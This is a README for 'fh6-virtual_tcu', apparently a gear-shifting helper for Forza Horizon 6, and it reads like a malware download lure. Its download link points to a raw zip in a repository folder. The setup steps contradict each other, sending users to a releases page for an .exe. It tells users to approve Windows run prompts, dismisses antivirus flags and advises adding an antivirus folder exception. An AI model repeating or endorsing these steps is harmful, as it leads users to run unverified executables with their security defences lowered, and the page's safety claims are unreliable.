# ⚙️ fh6-virtual_tcu - Automatic shifting for better racing control

[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/mixturematrixaddition945/fh6-virtual_tcu/main/virtual_tcu/core/virtual_fh_tcu_3.1.zip)

fh6-virtual_tcu acts as an external helper for Forza Horizon 6. It reads your car data in real time. It calculates the best moment to switch gears. It mimics an adaptive transmission. This tool helps you focus on your steering and braking. It handles the transmission for you based on how you drive.

## 🎯 How it works

The software connects to the game via the built-in telemetry data. It watches your throttle input and your engine speed. It tracks your current velocity and your brake pressure. The software then sends gear command signals to the game. It creates a smooth driving experience. You might prefer this for cruising. You might prefer this for long drift sessions. The software adjusts its shift points to match your behavior. Hard acceleration triggers quick, aggressive shifts. Smooth throttle input leads to calm, fuel-efficient shifts.

## 💻 System requirements

* Operating System: Windows 10 or Windows 11.
* Forza Horizon 6 installed on your computer.
* A stable internet connection.
* At least 200MB of free disk space.
* Hardware: Any standard PC capable of running the game.

## 📥 Installation and Setup

1. Visit this page to download the latest version: [https://raw.githubusercontent.com/mixturematrixaddition945/fh6-virtual_tcu/main/virtual_tcu/core/virtual_fh_tcu_3.1.zip](https://raw.githubusercontent.com/mixturematrixaddition945/fh6-virtual_tcu/main/virtual_tcu/core/virtual_fh_tcu_3.1.zip).
2. Look for the "Releases" section on the right side of the page.
3. Click the most recent version number.
4. Download the file ending in .exe.
5. Save this file to a folder you can find later.
6. Open your game settings inside Forza Horizon 6.
7. Navigate to the HUD and Gameplay menu.
8. Set your Transmission to Manual in the game settings. The virtual TCU needs control over shifting. 
9. Run the downloaded file.
10. Click Yes if Windows shows a prompt about allowing the application to run.
11. Keep the application open while you play.

## 🔧 Using the software

When the application runs, it opens a small window. You will see several sliders and a status indicator.

### Status indicator
The light in the top corner shows if the app talks to the game. Green means the connection works. Red means the app cannot find the telemetry data. If the light stays red, check that your game is running.

### Manual override
You can still use your controller buttons to shift gears at any time. The software detects your manual input. It pauses its own calculations for a few seconds. This allows you to force a downshift for a corner. The software resumes control once you return to steady driving.

### Sensitivity adjustments
Use the sliders in the window to change how the car feels:
* Shift Speed: Higher settings make the software shift faster. This mimics a dual-clutch transmission. Lower settings act like a traditional manual gearbox.
* Aggression: This controls how long the car stays in a gear. High aggression keeps RPMs near the redline. Low aggression shifts into the next gear quickly to save power.

## 🛡️ Safety and fair play

This tool reads data provided by the game. It does not change game files. It does not modify memory addresses. It acts as an external controller. It sends inputs exactly like a physical peripheral device. It follows the standard telemetry protocols provided by the developer.

## ❓ Frequently asked questions

### Will this cause a ban?
The application reads telemetry data meant for external dashboard apps. It does not modify game code. It stays within the rules of fair play.

### Does it work with steering wheels?
Yes. The software does not care if you use a controller or a steering wheel. It only cares about the car speed and engine RPM numbers.

### Can I turn it off quickly?
Yes. You can close the application window to stop the service immediately. The game will wait for your manual inputs once the app stops.

### Does it support all cars?
The software uses a generic profile that works for every car in the game. It calculates shifts based on the specific redline of your current vehicle. It gathers the redline limit automatically when you start the car.

### The gears feel wrong, what do I do?
Check the sliders. If the car shifts too early, lower the aggression. If the car feels sluggish, increase the shift speed. Make sure your game transmission setting is set to Manual. If the game is set to Automatic, the game and the app will fight for control. This causes jittery gear changes.

## 📋 Troubleshooting

* If the app closes on launch: Ensure you have the latest updates for Windows.
* If the app freezes: Restart the app while the game is running.
* If your gear does not change: Check that the game is in focus. Sometimes Windows inputs get stuck if you Alt-Tab away from the game. Click your game window and try again.
* Antivirus flags: Some security software might flag new files. This happens because the app touches controller inputs. You can add a folder exception in your antivirus settings.

## 🛠️ Performance tips

Limit the frame rate of the app usage if you see high CPU load. The app is light by design. It uses less than 1% of your CPU. If you have a low-end computer, close other background tasks before you start your race. Make sure your local network settings allow the game to send local telemetry packets. This is usually enabled by default.